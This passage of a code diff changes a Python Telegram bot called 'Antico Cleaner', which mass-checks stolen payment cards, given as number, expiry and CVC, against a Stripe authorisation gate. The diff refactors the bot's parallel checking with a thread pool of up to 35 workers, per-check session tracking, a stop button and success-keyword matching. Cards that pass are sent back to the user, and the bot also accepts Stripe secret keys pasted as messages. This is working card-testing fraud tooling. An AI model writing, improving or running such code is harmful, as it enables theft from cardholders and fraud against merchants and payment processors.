+            'checked': 0,
+            'total': total_cards,
+            'active': True  # Flag to stop the check
+        }
 
-        async def update_status():
-            while ACTIVE_CHECKS.get(user_id, False) and USER_SESSIONS[user_id]['checked'] < total_cards:
-                await asyncio.sleep(1)  # Update every second
-                
-                await context.bot.edit_message_text(
-                    chat_id=update.effective_chat.id,
-                    message_id=status_msg.message_id,
-                    text=(
-                        f"Antico Cleaner\n"
-                        f"Total Filtered Cards: {total_cards}\n\n"
-                        f"Please Wait Checking Your Cards 🟢\n\n"
-                        f"Gate -> Stripe Auth 🟢\n\n"
-                        f"Programmer -> @OUT_MAN0000 {datetime.now().strftime('%I:%M %p')}\n\n"
-                        f"CC • Last checked\n\n"
-                        f"Status • Processing\n\n"
-                        f"APPROVED !✔ • {USER_SESSIONS[user_id]['approved']}\n"
-                        f"DECLINED !✔ • {USER_SESSIONS[user_id]['declined']}\n"
-                        f"{USER_SESSIONS[user_id]['checked']} / {total_cards} •\n\n"
-                        f"Stop Check 🟢"
-                    ),
-                    reply_markup=InlineKeyboardMarkup([
-                        [InlineKeyboardButton("🛑 Stop Check", callback_data=f"stop_check_{user_id}")]
-                    ])
-                )
+        # Create thread pool with dynamic workers based on system resources
+        max_workers = min(35, (os.cpu_count() or 1) * 5)
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            futures = [executor.submit(process_card, card, check_id) for card in cards]
 
-        # Start status updates
-        asyncio.create_task(update_status())
+            for future in as_completed(futures):
+                if not USER_SESSIONS[user_id][check_id]['active']:
+                    break
 
-        # Process cards in parallel
-        tasks = []
-        for card in cards:
-            if not ACTIVE_CHECKS.get(user_id, True):
-                break
-                
-            task = asyncio.create_task(process_card(card))
-            tasks.append(task)
-            
-        for task in asyncio.as_completed(tasks):
-            result = await task
-            
-            if not ACTIVE_CHECKS.get(user_id, True):
-                break
-                
-            if result and result.get('status') == 'success':
-                USER_SESSIONS[user_id]['approved'] += 1
-                # Send approved card to user
-                await context.bot.send_message(
-                    chat_id=update.effective_chat.id,
-                    text=f"✅ APPROVED CARD\n{result['card']}\nResponse: {result['message']}"
-                )
-            else:
-                USER_SESSIONS[user_id]['declined'] += 1
-            
-            USER_SESSIONS[user_id]['checked'] += 1
+                try:
+                    result = future.result()
+                    if result and result.get('status') == 'success':
+                        USER_SESSIONS[user_id][check_id]['approved'] += 1
+                        # Send approved card to user
+                        await context.bot.send_message(
+                            chat_id=update.effective_chat.id,
+                            text=f"✅ APPROVED CARD\n{result['card']}\nResponse: {result['message']}"
+                        )
+                    else:
+                        USER_SESSIONS[user_id][check_id]['declined'] += 1
 
-        # Final update
-        if ACTIVE_CHECKS.get(user_id, False):
+                    USER_SESSIONS[user_id][check_id]['checked'] += 1
+
+                    # Update status message
+                    await context.bot.edit_message_text(
+                        chat_id=update.effective_chat.id,
+                        message_id=status_msg.message_id,
+                        text=(
+                            f"Antico Cleaner\n"
+                            f"Total Filtered Cards: {total_cards}\n\n"
+                            f"Please Wait Checking Your Cards 🟢\n\n"
+                            f"Gate -> Stripe Auth 🟢\n\n"
+                            f"Programmer -> @OUT_MAN0000 {datetime.now().strftime('%I:%M %p')}\n\n"
+                            f"CC • {result.get('card', '')}\n\n"
+                            f"Status • {'APPROVED 🟢' if result and result.get('status') == 'success' else 'DECLINED 🟢'}\n\n"
+                            f"APPROVED !✔ • {USER_SESSIONS[user_id][check_id]['approved']}\n"
+                            f"DECLINED !✔ • {USER_SESSIONS[user_id][check_id]['declined']}\n"
+                            f"{USER_SESSIONS[user_id][check_id]['checked']} / {total_cards} •\n\n"
+                            f"Stop Check 🟢"
+                        ),
+                        reply_markup=InlineKeyboardMarkup([
+                            [InlineKeyboardButton("🛑 Stop Check", callback_data=f"stop_check_{user_id}_{check_id}")]
+                        ])
+                    )
+
+                except Exception as e:
+                    continue
+
+        # Final message
+        if USER_SESSIONS[user_id][check_id]['active']:
             await context.bot.edit_message_text(
                 chat_id=update.effective_chat.id,
                 message_id=status_msg.message_id,
                 text=(
                     f"✅ Mass check completed!\n"
-                    f"Approved: {USER_SESSIONS[user_id]['approved']}\n"
-                    f"Declined: {USER_SESSIONS[user_id]['declined']}\n"
+                    f"Approved: {USER_SESSIONS[user_id][check_id]['approved']}\n"
+                    f"Declined: {USER_SESSIONS[user_id][check_id]['declined']}\n"
                     f"Total: {total_cards}"
                 )
             )
-            ACTIVE_CHECKS[user_id] = False
+        USER_SESSIONS[user_id][check_id]['active'] = False
+
+    @staticmethod
+    async def process_mstt_card(card, check_id, update, context, user_id, status_msg_id):
+        try:
+            cc_number, exp_month, exp_year, cvc = card.split('|')
+
+            result = await CardChecker.visit_website(cc_number, exp_month, exp_year, cvc)
+
+            # Check for success keywords
+            success_keywords = [
+                "succeeded", "success", "Thank you", "approved", "complete", 
+                "completed", "pass", "Thanks", "successful", "Saved payment method"
+            ]
+
+            is_success = any(keyword.lower() in str(result.get('message', '')).lower() for keyword in success_keywords)
+
+            return {
+                'status': 'success' if is_success else 'failed',
+                'message': result.get('message', 'Unknown response'),
+                'card': card
+            }
+
+        except Exception as e:
+            return {'status': 'error', 'message': str(e), 'card': card}
 
     @staticmethod
     async def stt_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1120,16 +1019,12 @@ class Commands:
             # Send processing message
             processing_msg = await update.message.reply_text("🔄 Processing your card, please wait...")
 
-            # Run validation in executor
-            loop = asyncio.get_event_loop()
-            result = await loop.run_in_executor(
-                CHECK_EXECUTOR,
-                lambda: asyncio.run(CardChecker.visit_website(cc_number, exp_month, exp_year, cvc))
-            
+            # Run validation
+            result = await CardChecker.visit_website(cc_number, exp_month, exp_year, cvc)
             bin_info = await CardChecker.check_bin(cc_number[:6])
 
             # Format response
-            status_emoji = "✅" if result['status'] == 'success' or (isinstance(result['message'], str) and 'success' in result['message'].lower() else "❌"
+            status_emoji = "✅" if result['status'] == 'success' or (isinstance(result['message'], str) and 'success' in result['message'].lower()) else "❌"
 
             response = f"""📌 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗗𝗲𝘁𝗮𝗶𝗹𝘀 🔥
 ━━━━━━━━━━━━━━━
@@ -1169,15 +1064,17 @@ class Commands:
     async def stop_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         query = update.callback_query
         await query.answer()
-        
-        user_id = int(query.data.split('_')[-1])
-        if user_id in ACTIVE_CHECKS:
-            ACTIVE_CHECKS[user_id] = False
+
+        user_id_check_id = query.data.split('_')
+        user_id = int(user_id_check_id[2])
+        check_id = user_id_check_id[3]
+        if user_id in USER_SESSIONS and check_id in USER_SESSIONS[user_id]:
+            USER_SESSIONS[user_id][check_id]['active'] = False
             await query.edit_message_text("🛑 Mass check stopped by user.")
 
 def run_bot():
-    # Initialize bot with increased timeout
-    application = Application.builder().token(BOT_TOKEN).read_timeout(30).write_timeout(30).build()
+    # Initialize bot
+    application = Application.builder().token(BOT_TOKEN).build()
 
     # Add command handlers
     application.add_handler(CommandHandler("start", Commands.start))
@@ -1192,19 +1089,13 @@ def run_bot():
     application.add_handler(CommandHandler("stt", Commands.stt_command))
     application.add_handler(CommandHandler("stop", Commands.stop_command))
     application.add_handler(CallbackQueryHandler(Commands.button_callback))
-    application.add_handler(CallbackQueryHandler(Commands.stop_check_callback, pattern=r"^stop_check_\d+$"))
+    application.add_handler(CallbackQueryHandler(Commands.stop_check_callback, pattern=r"^stop_check_\d+_\w+$"))
 
     # Add message handler for SK input
     application.add_handler(MessageHandler(filters.TEXT & filters.Regex('^sk_') & ~filters.COMMAND, Commands.handle_sk_message))
 
-    # Start bot with increased concurrency
-    application.run_polling(
-        allowed_updates=Update.ALL_TYPES,
-        pool_timeout=30,
-        read_timeout=30,
-        write_timeout=30,
-        close_loop=False
-    )
+    # Start bot
+    application.run_polling(allowed_updates=Update.ALL_TYPES, pool_timeout=30, read_timeout=30, write_timeout=30)
 
 @app.route('/')
 def home():
@@ -1214,7 +1105,6 @@ if __name__ == "__main__":
     # Start Flask in a separate thread
     import threading
     flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000))
-    flask_thread.daemon = True
     flask_thread.start()
 
     # Start Telegram bot
